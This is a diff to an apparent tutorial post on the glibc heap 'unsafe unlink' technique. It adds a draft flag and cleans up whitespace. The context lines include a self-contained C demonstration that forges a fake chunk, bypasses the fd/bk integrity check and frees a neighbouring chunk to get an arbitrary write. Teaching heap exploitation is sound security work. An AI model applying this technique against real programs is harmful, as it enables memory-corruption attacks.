@@ -7,6 +7,7 @@
     description: "Exploiting the unlink macro to achieve arbitrary write by corrupting pointers.",
     date: "2025-12-26",
     order: 22,
+    draft: true,
   ),
 )<frontmatter>
 
@@ -14,7 +15,7 @@
 
 == Introduction
 
-The `unlink` vulnerability occurs when a program can trigger the removal of a chunk from a doubly-linked list (like the unsorted, small, or large bins) while having control over the chunk's metadata (`fd` and `bk` pointers). 
+The `unlink` vulnerability occurs when a program can trigger the removal of a chunk from a doubly-linked list (like the unsorted, small, or large bins) while having control over the chunk's metadata (`fd` and `bk` pointers).
 
 In modern glibc versions, a crucial check was introduced to prevent simple `unlink` attacks:
 ```c
@@ -58,54 +59,54 @@ int main()
 {
 	setbuf(stdout, NULL);
 	printf("Welcome to unsafe unlink 2.0!\n");
-	
+
 	// Large enough to avoid tcache/fastbin
-	int malloc_size = 0x420; 
+	int malloc_size = 0x420;
 	int header_size = 2;
 
 	chunk0_ptr = (uint64_t*) malloc(malloc_size); // chunk0
 	uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); // chunk1
-	
+
 	printf("Global chunk0_ptr is at %p, pointing to %p\n", &chunk0_ptr, chunk0_ptr);
 	printf("Victim chunk is at %p\n\n", chunk1_ptr);
 
-	/* 
+	/*
 	   1. Create a fake chunk inside chunk0.
 	   Bypass: (P->fd->bk != P || P->bk->fd != P) == False
 	*/
-	
+
 	// Set fake prev_size to match chunk0's actual size
-	chunk0_ptr[1] = chunk0_ptr[-1] - 0x10; 
-	
+	chunk0_ptr[1] = chunk0_ptr[-1] - 0x10;
+
 	// P->fd = &P - 3
 	chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
 	// P->bk = &P - 2
 	chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
 
-	/* 
+	/*
 	   2. Trigger backward consolidation.
 	   We assume an overflow from chunk0 into chunk1's metadata.
 	*/
 	uint64_t *chunk1_hdr = chunk1_ptr - header_size;
-	
+
 	// Set chunk1->prev_size to point to our fake chunk
-	chunk1_hdr[0] = malloc_size; 
-	
+	chunk1_hdr[0] = malloc_size;
+
 	// Clear PREV_INUSE bit of chunk1
 	chunk1_hdr[1] &= ~1;
 
-	/* 
+	/*
 	   3. Free chunk1 to trigger unlink(chunk0)
 	*/
 	free(chunk1_ptr);
 
-	/* 
+	/*
 	   4. Now chunk0_ptr points to (&chunk0_ptr - 3).
 	   We can use it to achieve arbitrary write.
 	*/
 	char victim_string[8];
 	strcpy(victim_string,"Hello!~");
-	
+
 	// Overwrite chunk0_ptr with the address of victim_string
 	chunk0_ptr[3] = (uint64_t) victim_string;
 
